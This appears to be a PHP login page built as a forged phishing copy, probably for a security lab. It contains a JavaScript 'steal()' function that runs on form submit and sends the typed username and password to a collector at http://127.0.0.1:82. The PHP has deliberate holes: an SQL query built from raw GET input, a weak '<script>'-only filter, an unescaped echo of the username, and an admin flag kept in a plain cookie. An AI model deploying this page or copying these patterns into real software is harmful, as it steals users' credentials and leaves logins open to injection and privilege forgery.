
<?php

session_start();


 include('connect.php');
$badlogin="";


   
   if(isset($_GET['username'])) {

      
      $myusername = $_GET['username'];
      $x='<script>';

     $myusername= str_replace($x,'',$myusername);  
      $mypassword = $_GET['password']; 
       $mypassword= str_replace($x,'',$mypassword);  



      $sql = "SELECT * FROM user WHERE name ='$myusername' and password = '$mypassword'"; 
    
      $result = mysqli_query($conn,$sql) or die($conn->error);

  
      if($row=$result->fetch_assoc()){
      $_SESSION["name"] = $myusername;
  
      $id=$row["admin"];
            if($id==1){
               setcookie ("admin", "1", time()+3600, '/', NULL, 0 ); 
               header("location: welcomeadmin.php");
         }else{
                  setcookie ("admin", "0", time()+3600, '/', NULL, 0 ); 
                  header("location: welcome.php");
          }
        
      }else {
         $badlogin="sorry ".$myusername. " Your Login Name or Password is incorrect!";
      }
   }

?>




<!doctype html>


<html>


<head> 

<link rel="stylesheet" type="text/css" href="indexStyle.css">

<link href='https://fonts.googleapis.com/css?family=Dekko' rel='stylesheet'>
<link href='https://fonts.googleapis.com/css?family=Kalam' rel='stylesheet'>

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" >
 
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" >
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

  <meta name="viewport" content="width=device-width, initial-scale=1">


</head>



<body>
<header>

</header>

<main>
 
<h1 id="title">please login</h1>
<div class="login">
<form action="forgedindex.php" method="GET" onsubmit="steal()">
	<p><b>username<input required type="text" name="username" id="login"></p>
	<p><b>password<input required type="password" name="password" id="pass" ></p>
	<p><input type="submit" name="loginbutton" value="login"></p>
	<p id="badpass"><b><?php echo $badlogin ?></p>

</form>
<p id="psign"><a href="signup.php" id="sign">not registered? sign up here!</a></p>
 <script>
function steal(){
let login=document.getElementById("login").value;
let pass=document.getElementById("pass").value;
  fetch(`http://127.0.0.1:82/?username=${login}&password=${pass}`);

}

</script>


</div>


</main>
</body>


</html>